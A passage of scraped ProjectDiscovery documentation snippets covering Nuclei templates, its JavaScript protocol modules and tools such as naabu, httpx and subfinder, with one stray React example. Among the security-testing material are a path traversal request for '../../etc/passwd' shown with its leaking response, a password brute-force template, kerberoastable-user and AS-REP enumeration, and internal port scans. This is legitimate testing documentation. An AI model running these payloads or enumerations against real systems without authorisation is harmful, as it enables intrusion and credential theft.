logic (this will skip printing this event/result)\n\n  - method: POST\n    path:\n      - \"{{BaseURL}}/wp-content/plugins/backup-backup/includes/backup-heart.php\"\n    headers:\n      Content-Dir: \"{{rand_text_alpha(10)}}\"\n\n    matchers:\n      - type: dsl\n        dsl:\n          - 'len(body) == 0'\n          - 'status_code == 200'\n          - '!contains(body, \"Incorrect parameters\")'\n        condition: and\n```\n\n----------------------------------------\n\nTITLE: Running Nuclei File Templates from Command Line\nDESCRIPTION: Examples of how to run Nuclei file templates against different targets. The first command scans a directory while the second targets a specific file.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/file.mdx#2025-04-12_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n# Running file template on http-response/ directory\nnuclei -t file.yaml -file -target http-response/\n\n# Running file template on output.txt\nnuclei -t file.yaml -file -target output.txt\n```\n\n----------------------------------------\n\nTITLE: Connecting to PostgreSQL Database\nDESCRIPTION: Establishes a connection to a PostgreSQL database using host, port, and username credentials. Returns boolean indicating connection success.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/postgres.PGClient.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst postgres = require('nuclei/postgres');\nconst client = new postgres.PGClient;\nconst connected = client.Connect('acme.com', 5432, 'username', 'password');\n```\n\n----------------------------------------\n\nTITLE: Implementing Request Annotations in Nuclei YAML Template\nDESCRIPTION: This snippet demonstrates how to use request annotations to override host, TLS SNI, and timeout in a Nuclei HTTP request. It shows the syntax for @Host, @tls-sni, and @timeout annotations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/request-tampering.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n- |\n  @Host: https://projectdiscovery.io:443\n  POST / HTTP/1.1\n  Pragma: no-cache\n  Host: {{Hostname}}\n  Cache-Control: no-cache, no-transform\n  User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n```\n\n----------------------------------------\n\nTITLE: Executing Lua Script on Redis Server\nDESCRIPTION: Runs a Lua script on a Redis server with authentication. Requires host, port, password and the Lua script as parameters. Returns the script execution result or null on failure.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/redis.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst redis = require('nuclei/redis');\nconst result = redis.RunLuaScript('acme.com', 6379, 'password', 'return redis.call(\"get\", KEYS[1])');\n```\n\n----------------------------------------\n\nTITLE: Connecting to Specific PostgreSQL Database\nDESCRIPTION: Connects to a specific PostgreSQL database using connection credentials and database name. Returns boolean indicating connection success.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/postgres.PGClient.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst postgres = require('nuclei/postgres');\nconst client = new postgres.PGClient;\nconst connected = client.ConnectWithDB('acme.com', 5432, 'username', 'password', 'dbname');\n```\n\n----------------------------------------\n\nTITLE: Declaring DN Property for LDAP Entry in TypeScript\nDESCRIPTION: This snippet declares the optional DN (Distinguished Name) property of the Entry interface. It is of type string and is defined in the ldap.ts file at line 542.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Entry.mdx#2025-04-12_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\nDN?: string;\n```\n\n----------------------------------------\n\nTITLE: Configuring Concurrency in Nuclei CLI\nDESCRIPTION: Sets the concurrency flag to control parallelism of template execution and request sending in Nuclei.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n-c <number> or -concurrency <number>\n```\n\n----------------------------------------\n\nTITLE: Clicking Elements in Nuclei Headless Protocol\nDESCRIPTION: This snippet demonstrates how to use the 'click' action to simulate a left-mouse button click on an element specified by an XPath selector.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\naction: click\nargs: \n  by: xpath\n  xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input\n```\n\n----------------------------------------\n\nTITLE: Connecting to MySQL Database using DSN in JavaScript\nDESCRIPTION: Connects to a MySQL database using a Data Source Name (DSN) string. Returns a boolean indicating success or failure.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.MySQLClient.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst mysql = require('nuclei/mysql');\nconst client = new mysql.MySQLClient;\nconst connected = client.ConnectWithDSN('username:password@tcp(acme.com:3306)/');\n```\n\n----------------------------------------\n\nTITLE: Implementing a Counter Component with React Hooks\nDESCRIPTION: This example demonstrates creating a simple counter component using React hooks. It showcases the useState hook for state management and event handling for incrementing the counter value. The example also shows how to render the component to the DOM using createRoot.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/react/README.md#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport { useState } from 'react';\nimport { createRoot } from 'react-dom/client';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  return (\n    <>\n      <h1>{count}</h1>\n      <button onClick={() => setCount(count + 1)}>\n        Increment\n      </button>\n    </>\n  );\n}\n\nconst root = createRoot(document.getElementById('root'));\nroot.render(<Counter />);\n```\n\n----------------------------------------\n\nTITLE: Checking for Open SMTP Relay in JavaScript\nDESCRIPTION: Demonstrates how to create an SMTP message and check if a host is an open relay using the IsOpenRelay method.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.Client.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst message = new smtp.SMTPMessage();\nmessage.From('xyz@projectdiscovery.io');\nmessage.To('xyz2@projectdiscoveyr.io');\nmessage.Subject('hello');\nmessage.Body('hello');\nconst client = new smtp.Client('acme.com', 25);\nconst isRelay = client.IsOpenRelay(message);\n```\n\n----------------------------------------\n\nTITLE: Listing SMB Shares\nDESCRIPTION: Connects to an SMB server and lists available shares using provided credentials. Supports guest/anonymous access with empty password.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.SMBClient.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst smb = require('nuclei/smb');\nconst client = new smb.SMBClient();\nconst shares = client.ListShares('acme.com', 445, 'username', 'password');\n\tfor (const share of shares) {\n\t\t  log(share);\n\t}\n```\n\n----------------------------------------\n\nTITLE: Configuring Clusterbomb Attack for HTTP Fuzzing in Nuclei\nDESCRIPTION: This snippet illustrates how to set up a clusterbomb attack for HTTP fuzzing in Nuclei. It defines the attack type and payload sources for path and header parameters.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-payloads.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nhttp:\n  - raw:\n      - |\n        POST /?file={{path}} HTTP/1.1\n        User-Agent: {{header}}\n        Host: {{Hostname}}\n\n    attack: clusterbomb # Defining HTTP fuzz attack type\n    payloads:\n      path: helpers/wordlists/prams.txt\n      header: helpers/wordlists/header.txt\n```\n\n----------------------------------------\n\nTITLE: Packing Data with Structs Module\nDESCRIPTION: Demonstrates how to use the Pack function to convert values into a byte array according to a format string. Requires the nuclei/structs module and returns a Uint8Array or null.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/structs.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst structs = require('nuclei/structs');\nconst packed = structs.Pack('H', [0]);\n```\n\n----------------------------------------\n\nTITLE: Naabu Port Scan with Port Exclusion in Bash\nDESCRIPTION: Scan all ports except 80 and 443 using Naabu. The '-' flag indicates scanning all ports, while -exclude-ports specifies ports to skip.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/running.mdx#2025-04-12_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nnaabu -p - -exclude-ports 80,443\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Scan Statistics\nDESCRIPTION: This YAML snippet defines an OpenAPI endpoint specification for retrieving scan statistics via a GET request to the path '/v1/scans/stats'.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/get-all-scan-stats.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans/stats\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Path Traversal Vulnerability in HTTP\nDESCRIPTION: This snippet demonstrates a Path Traversal vulnerability in a file download function. The application fetches the file specified in the 'file' parameter from the server file system without proper validation, potentially exposing sensitive files.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/editor/ai.mdx#2025-04-12_snippet_5\n\nLANGUAGE: http\nCODE:\n```\nGET /download?file=../../etc/passwd HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n```\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 1827\nServer: Apache\n\nroot:x:0:0:root:/root:/bin/bash\n```\n\n----------------------------------------\n\nTITLE: Defining HTTP Method in Nuclei Template\nDESCRIPTION: Specifies the HTTP method to be used in the request, such as GET, POST, PUT, or DELETE.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# Method is the method for the request\nmethod: GET\n```\n\n----------------------------------------\n\nTITLE: Navigating to a URL in Nuclei Headless Protocol\nDESCRIPTION: This snippet demonstrates how to use the 'navigate' action to visit a specific URL. It supports variables like {{BaseURL}} and {{Hostname}} for customization.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\naction: navigate\nargs: \n  url: \"{{BaseURL}}\n```\n\n----------------------------------------\n\nTITLE: Checking RDP Authentication in JavaScript\nDESCRIPTION: This function checks if a given host and port are running an RDP server with authentication and returns their metadata. It requires the 'nuclei/rdp' module and returns a CheckRDPAuthResponse object or null.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rdp.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst rdp = require('nuclei/rdp');\nconst checkRDPAuth = rdp.CheckRDPAuth('acme.com', 3389);\nlog(toJSON(checkRDPAuth));\n```\n\n----------------------------------------\n\nTITLE: Running Subfinder for Basic Domain Enumeration\nDESCRIPTION: This snippet demonstrates how to use Subfinder to enumerate subdomains for a specific target domain using the -d flag. It shows the command and expected output format.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nsubfinder -d hackerone.com\n```\n\n----------------------------------------\n\nTITLE: Sending Email via SMTP in JavaScript\nDESCRIPTION: Illustrates how to create an SMTP message and send it using the SendMail method of the SMTP Client.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.Client.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst message = new smtp.SMTPMessage();\nmessage.From('xyz@projectdiscovery.io');\nmessage.To('xyz2@projectdiscoveyr.io');\nmessage.Subject('hello');\nmessage.Body('hello');\nconst client = new smtp.Client('acme.com', 25);\nconst isSent = client.SendMail(message);\nlog(isSent)\n```\n\n----------------------------------------\n\nTITLE: Setting Request Body in Nuclei HTTP Request\nDESCRIPTION: Shows how to include a request body in a Nuclei HTTP request, supporting both JSON and form data.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http.mdx#2025-04-12_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\n# Body is a string sent along with the request\nbody: \"{\\\"some random JSON\\\"}\"\n\n# Body is a string sent along with the request\nbody: \"admin=test\"\n```\n\n----------------------------------------\n\nTITLE: Taking Screenshots with httpx in Bash\nDESCRIPTION: This snippet shows how to use httpx to take screenshots of target URLs. The -screenshot option enables capturing visual content of web pages.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\nhttpx -screenshot -u https://example.com\n```\n\n----------------------------------------\n\nTITLE: Verifying RDP Server Presence\nDESCRIPTION: Example demonstrating how to verify if a host is running an RDP server on a specific port. Returns connection status and OS information if successful.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rdp.RDPClient.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst rdp = require('nuclei/rdp');\nconst isRDP = rdp.IsRDP('acme.com', 3389);\nlog(toJSON(isRDP));\n```\n\n----------------------------------------\n\nTITLE: Implementing HTTP Pipelining in Nuclei YAML Template\nDESCRIPTION: This YAML template demonstrates a complete implementation of HTTP pipelining in Nuclei. It includes configuration for pipelining, payload attacks, and matchers for status code verification.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/connection-tampering.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: pipeline-testing\ninfo:\n  name: pipeline testing\n  author: pdteam\n  severity: info\n\nhttp:\n  - raw:\n      - |+\n        GET /{{path}} HTTP/1.1\n        Host: {{Hostname}}\n        Referer: {{BaseURL}}\n\n    attack: batteringram\n    payloads:\n      path: path_wordlist.txt\n\n    unsafe: true\n    pipeline: true\n    pipeline-concurrent-connections: 40\n    pipeline-requests-per-connection: 25000\n\n    matchers:\n      - type: status\n        part: header\n        status:\n          - 200\n```\n\n----------------------------------------\n\nTITLE: Defining Reusable Dynamic Extractors in YAML for Nuclei\nDESCRIPTION: Example of reusable dynamic extractors in a raw HTTP request template, demonstrating how to extract a title and use it immediately in the next extractor.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/extractors.mdx#2025-04-12_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nid: basic-raw-example\n\ninfo:\n  name: Test RAW Template\n  author: pdteam\n  severity: info\n\n\nhttp:\n  - raw:\n      - |\n        GET / HTTP/1.1\n        Host: {{Hostname}}\n\n    extractors:\n      - type: regex\n        name: title\n        group: 1\n        regex:\n          - '<title>(.*)<\\/title>'\n        internal: true\n\n      - type: dsl\n        dsl:\n          - '\"Title is \" + title'\n```\n\n----------------------------------------\n\nTITLE: Installing ProjectDiscovery Tool Manager (PDTM) with Go\nDESCRIPTION: Command to install PDTM (ProjectDiscovery Tool Manager) using Go. PDTM is a utility that helps install and update all ProjectDiscovery tools easily.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/quickstart/index.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/pdtm/cmd/pdtm@latest\n```\n\n----------------------------------------\n\nTITLE: Implementing Connection Pooling in Nuclei YAML Template\nDESCRIPTION: This YAML template demonstrates how to implement HTTP connection pooling in Nuclei. It includes configuration for thread-based pooling, payload attacks, and matchers for response verification.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/connection-tampering.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nid: fuzzing-example\ninfo:\n  name: Connection pooling example\n  author: pdteam\n  severity: info\n\nhttp:\n\n  - raw:\n      - |\n        GET /protected HTTP/1.1\n        Host: {{Hostname}}\n        Authorization: Basic {{base64('admin:§password§')}}\n\n    attack: batteringram\n    payloads:\n      password: password.txt\n    threads: 40\n\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n\n      - type: word\n        words:\n          - \"Unique string\"\n        part: body\n```\n\n----------------------------------------\n\nTITLE: Checking Oracle Server Presence\nDESCRIPTION: Example demonstrating how to check if a host is running an Oracle server using the IsOracle method. Takes host and port parameters and returns an IsOracleResponse object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/oracle.OracleClient.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst oracle = require('nuclei/oracle');\nconst isOracle = oracle.IsOracle('acme.com', 1521);\nlog(toJSON(isOracle));\n```\n\n----------------------------------------\n\nTITLE: Complex Notification Pipeline with Multiple Tools\nDESCRIPTION: Advanced example combining subfinder, httpx, and nuclei with notify for vulnerability scanning notifications\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/running.mdx#2025-04-12_snippet_5\n\nLANGUAGE: sh\nCODE:\n```\nsubfinder -d intigriti.com | httpx | nuclei -tags exposure -o output.txt; notify -bulk -data output.txt\n```\n\n----------------------------------------\n\nTITLE: AND Condition Word Matcher in YAML\nDESCRIPTION: Example of using AND condition with word matchers to match multiple patterns in response body.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nmatchers:\n  # Match the body word\n  - type: word\n   # Some words we want to match\n   words:\n     - \"[core]\"\n     - \"[config]\"\n   # Both words must be found in the response body\n   condition: and\n   #  We want to match request body (default)\n   part: body\n```\n\n----------------------------------------\n\nTITLE: Defining HTTP Payloads with Local Wordlist in Nuclei\nDESCRIPTION: This snippet demonstrates how to define HTTP payloads using local wordlists in Nuclei. It specifies paths and header payloads from separate text files.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-payloads.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\npayloads:\n  paths: params.txt\n  header: local.txt\n```\n\n----------------------------------------\n\nTITLE: Targeting User-Specified URL with Blank Request URI\nDESCRIPTION: Demonstrates how to make a request to a URL specified as input without additional tampering by using a blank Request URI. This approach directs the request to the user-specified input.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/raw-http.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n    - raw:\n      - |\n        GET HTTP/1.1\n        Host: {{Hostname}}\n```\n\n----------------------------------------\n\nTITLE: Path Bruteforce Scanning\nDESCRIPTION: Demonstrates path bruteforcing across multiple URLs to discover endpoints and their response codes.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nhttpx -l urls.txt -path /v1/api -sc\n```\n\n----------------------------------------\n\nTITLE: Getting Redis Server Info with Authentication\nDESCRIPTION: Retrieves server information from a password-protected Redis instance. Requires host, port and password parameters, returns server info as string or null if failed.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/redis.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst redis = require('nuclei/redis');\nconst info = redis.GetServerInfoAuth('acme.com', 6379, 'password');\n```\n\n----------------------------------------\n\nTITLE: Querying Kerberoastable AD Users - JavaScript LDAP\nDESCRIPTION: Retrieves all Active Directory users that are kerberoastable using FilterIsPerson, FilterAccountEnabled and FilterHasServicePrincipalName filters. Returns a SearchResult object containing matching users.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nconst kerberoastable = client.GetADUserKerberoastable();\nlog(to_json(kerberoastable));\n```\n\n----------------------------------------\n\nTITLE: Installing All Tools with PDTM\nDESCRIPTION: Example showing how to use PDTM's -install-all flag to install all available ProjectDiscovery tools. The output shows successful installation of tools like httpx, nuclei, naabu, and dnsx with their respective versions.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/pdtm/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ pdtm -install-all\n                ____          \n     ____  ____/ / /_____ ___ \n    / __ \\/ __  / __/ __ __  \\\n   / /_/ / /_/ / /_/ / / / / /\n  / .___/\\__,_/\\__/_/ /_/ /_/ \n /_/                          v0.0.1\n\n      projectdiscovery.io\n\n[INF] Installed httpx v1.1.1\n[INF] Installed nuclei v2.6.3\n[INF] Installed naabu v2.6.3\n[INF] Installed dnsx v2.6.3\n```\n\n----------------------------------------\n\nTITLE: Multi-Engine Search Query\nDESCRIPTION: Example of using uncover to run a single query against multiple search engines simultaneously using the -e flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/uncover/running.mdx#2025-04-12_snippet_2\n\nLANGUAGE: console\nCODE:\n```\necho jira | uncover -e shodan,censys,fofa,quake,hunter,zoomeye,netlas,criminalip\n```\n\n----------------------------------------\n\nTITLE: Checking MySQL Server Availability in JavaScript\nDESCRIPTION: Checks if a given host is running a MySQL database. Returns a boolean indicating if MySQL is detected.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.MySQLClient.mdx#2025-04-12_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nconst mysql = require('nuclei/mysql');\nconst isMySQL = mysql.IsMySQL('acme.com', 3306);\n```\n\n----------------------------------------\n\nTITLE: Defining HTTP Payloads with In-Template Wordlist in Nuclei\nDESCRIPTION: This example shows how to define HTTP payloads using an in-template wordlist in Nuclei. It specifies a list of passwords directly in the template.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-payloads.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\npayloads:\n  password:\n    - admin\n    - guest\n    - password\n```\n\n----------------------------------------\n\nTITLE: Finding Subdomains with Chaos CLI\nDESCRIPTION: Shows how to use Chaos to find subdomains for a specific domain. This is the basic usage of the tool.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nchaos -d uber.com\n```\n\n----------------------------------------\n\nTITLE: Implementing RSync Protocol Check in JavaScript\nDESCRIPTION: Example demonstrating how to use the rsync module to check if a host is running rsync on a specific port. The code imports the rsync module, performs a check, and logs the JSON response.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rsync.IsRsyncResponse.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst rsync = require('nuclei/rsync');\nconst isRsync = rsync.IsRsync('acme.com', 873);\nlog(toJSON(isRsync));\n```\n\n----------------------------------------\n\nTITLE: Basic DNS Template for CNAME Detection\nDESCRIPTION: A basic DNS template that sends a CNAME record request for a given FQDN and uses a word matcher to detect if a CNAME record exists in the response. It includes configuration for recursion and retry attempts.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/dns-examples.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: basic-dns-example\n\ninfo:\n  name: Test DNS Template\n  author: pdteam\n  severity: info\n\ndns:\n  - name: \"{{FQDN}}\"\n    type: CNAME\n    class: inet\n    recursion: true\n    retries: 3\n    matchers:\n      - type: word\n        words:\n          # The response must contain a CNAME record\n          - \"IN\\tCNAME\"\n```\n\n----------------------------------------\n\nTITLE: Port Discovery with Naabu in Bash\nDESCRIPTION: Commands for using Naabu to scan internal subnets and specific port ranges, with options for faster scanning. These commands help identify open ports in the internal network before vulnerability scanning.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/internal-scan.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n# Scan entire internal subnet and save results\nnaabu -host 192.168.1.1/24 -o internal_ports.txt\n\n# Scan specific port ranges\nnaabu -host 192.168.1.1/24 -p 80,443,8000-9000 -o internal_ports.txt\n\n# Faster scanning with increased rate\nnaabu -host 192.168.1.1/24 -rate 1000 -o internal_ports.txt\n```\n\n----------------------------------------\n\nTITLE: Specifying Port in Nuclei Network Template\nDESCRIPTION: Demonstrates the new 'port' field introduced in Nuclei v2.9.15 for specifying the target port separately from the host.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nhost:\n  - \"{{Hostname}}\"\nport: 22\n```\n\n----------------------------------------\n\nTITLE: Sample JSON Request Body for Configuring External Vulnerability Scan\nDESCRIPTION: This JSON payload configures an external vulnerability scan, specifying the scan name, target domains, vulnerability templates to use, and various configuration IDs for scan settings, alerting, and reporting.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/external-scan.mdx#2025-04-12_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"name\": \"External Scan\",\n  \"targets\": [\"example.com\"],\n  \"templates\": [\"cves\", \"vulnerabilities\"],\n  \"recommended\": true,\n  \"scan_config_ids\": [\"config-id\"],\n  \"alerting_config_ids\": [\"alert-id\"],\n  \"reporting_config_ids\": [\"report-id\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Status Code Matcher in YAML\nDESCRIPTION: Demonstrates how to match specific HTTP status codes in responses using Nuclei matchers.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmatchers:\n  # Match the status codes\n  - type: status\n    # Some status codes we want to match\n    status:\n      - 200\n      - 302\n```\n\n----------------------------------------\n\nTITLE: Querying All AD Users - JavaScript LDAP\nDESCRIPTION: Retrieves all Active Directory users using FilterIsPerson filter. Returns a SearchResult object containing all users.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nconst users = client.GetADUsers();\nlog(to_json(users));\n```\n\n----------------------------------------\n\nTITLE: Enumerating Kerberos User\nDESCRIPTION: Demonstrates how to enumerate a Kerberos user and attempt to get AS-REP hash by disabling PA-FX-FAST. Returns an EnumerateUserResponse object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.Client.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst kerberos = require('nuclei/kerberos');\nconst client = new kerberos.Client('acme.com', 'kdc.acme.com');\nconst resp = client.EnumerateUser('pdtm');\nlog(resp);\n```\n\n----------------------------------------\n\nTITLE: Installing TunnelX using Go in Bash\nDESCRIPTION: Commands for installing TunnelX using Go and running it with an API key. This method is an alternative to Docker installation for cloud-managed internal scanning.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/internal-scan.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n# Install using go install\ngo install github.com/projectdiscovery/tunnelx@latest\n\n# Set your API key and run\nexport PDCP_API_KEY=\"your_api_key\"\ntunnelx\n```\n\n----------------------------------------\n\nTITLE: Checking Redis Authentication Requirement\nDESCRIPTION: Verifies if a Redis server requires authentication. Takes host and port as parameters and returns boolean indicating if authentication is required or null on error.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/redis.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst redis = require('nuclei/redis');\nconst isAuthenticated = redis.IsAuthenticated('acme.com', 6379);\n```\n\n----------------------------------------\n\nTITLE: Setting Max Requests in Nuclei Template\nDESCRIPTION: Defines the 'max-requests' metadata field in a Nuclei template to specify the maximum number of outgoing requests the template can make.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmax-requests: <number>\n```\n\n----------------------------------------\n\nTITLE: Checking for VNC Server with IsVNC Method in JavaScript\nDESCRIPTION: Demonstrates how to use the IsVNC method of VNCClient to check if a host is running a VNC server. It takes a host and port as parameters and returns an IsVNCResponse object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/vnc.VNCClient.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst vnc = require('nuclei/vnc');\nconst isVNC = vnc.IsVNC('acme.com', 5900);\nlog(toJSON(isVNC));\n```\n\n----------------------------------------\n\nTITLE: Decoding Active Directory Timestamp in JavaScript\nDESCRIPTION: Example of using the DecodeADTimestamp function to decode an Active Directory timestamp.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst timestamp = ldap.DecodeADTimestamp('132036744000000000');\nlog(timestamp);\n```\n\n----------------------------------------\n\nTITLE: Defining XPath Extractor in YAML for Nuclei\nDESCRIPTION: Example of an XPath extractor to extract the value of the 'href' attribute from an HTML response.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/extractors.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nextractors:\n  - type: xpath # type of the extractor\n    attribute: href # attribute value to extract (optional)\n    xpath:\n      - '/html/body/div/p[2]/a' # xpath value for extraction\n```\n\n----------------------------------------\n\nTITLE: Sending Email via SMTP in JavaScript\nDESCRIPTION: Example demonstrating how to send an email using the 